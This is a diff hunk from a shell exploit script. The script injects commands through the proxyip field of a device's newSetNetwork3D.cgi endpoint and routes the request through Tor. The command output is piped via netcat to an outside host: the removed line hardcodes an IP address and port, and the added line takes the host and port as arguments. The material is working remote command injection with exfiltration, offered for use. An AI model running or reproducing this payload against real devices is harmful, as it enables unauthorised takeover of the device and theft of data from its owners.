@@ -169,7 +169,7 @@ echo "Let's try to Execute commands via newSetNetwork3D.cgi proxyip and send out
 echo "Output will be sent to $3:$4"
 echo "Executing payload ... "
 
-timeout 10 torify curl -s -X POST "$1/cgi-bin/newSetNetwork3D.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data "allValues=[{\"Name\":\"isProxy\",\"Value\":\"on\"},{\"Name\":\"proxyip\",\"Value\":\"\$($2 | nc 163.172.57.176 5555)\"},{\"Name\":\"proxyport\",\"Value\":\"\"}]" >/dev/null
+timeout 10 torify curl -s -X POST "$1/cgi-bin/newSetNetwork3D.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data "allValues=[{\"Name\":\"isProxy\",\"Value\":\"on\"},{\"Name\":\"proxyip\",\"Value\":\"\$($2 | nc $3 $4)\"},{\"Name\":\"proxyport\",\"Value\":\"\"}]" >/dev/null
 sleep 2
 echo " "
 
